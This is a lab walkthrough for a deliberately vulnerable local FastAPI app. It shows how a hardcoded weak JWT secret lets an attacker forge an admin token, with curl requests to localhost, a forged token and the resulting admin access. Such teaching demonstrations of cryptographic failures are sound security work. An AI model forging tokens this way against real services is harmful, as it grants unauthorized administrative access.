## Prerequisites
First, ensure the vulnerable server (vulnerable.py) is running with the following command:

```Bash
uvicorn vulnerable:app --reload
```

## Exploitation Steps
The goal is to demonstrate how an attacker who discovers a weak, hardcoded secret key (from vulnerable.py) can use a separate script (exploit.py) to forge a perfectly valid token and gain administrative privileges.

1. Verify Initial (Non-Admin) Status
Before the attack, we log in as a regular user, bob, to get a normal, non-admin token.

```Bash
curl -X POST "http://127.0.0.1:8000/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "bob"}'
```

We then use this token to try and access the admin endpoint.

```Bash
curl -X GET "http://127.0.0.1:8000/admin/data" \
     -H "Authorization: Bearer <paste_normal_token_here>"
```

Expected Response (Access Denied):

```JSON
{"detail":"Admins only!"}
```
2. Perform the Exploit (Forge and Use Token)
The attacker has found the weak secret key in vulnerable.py. They run exploit.py to generate a new token with an admin payload.

```Bash
python exploit.py
```
Expected Response (Token Generated):
```Bash
Forged Admin Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.W2F7G0sSA3gAgiH2yIHawQ52w0lHFTuPyH0IqgCez_M
```

The attacker now uses this forged token to access the admin endpoint.

```Bash
curl -X GET "http://127.0.0.1:8000/admin/data" \
     -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.W2F7G0sSA3gAgiH2yIHawQ52w0lHFTuPyH0IqgCez_M"
```
3. Analyze the Result
The server receives the forged token. It checks the signature using its own hardcoded key, finds that the signature is mathematically correct, and completely trusts the malicious payload.

Successful Exploit Response (Access Granted):

```JSON
{
  "message": "Secret admin data accessed!",
  "user_data": {
    "sub": "attacker",
    "role": "admin"
  }
}
```
This confirms that the attacker successfully gained admin access by exploiting a weak, hardcoded secret key. This is a critical Cryptographic Failure.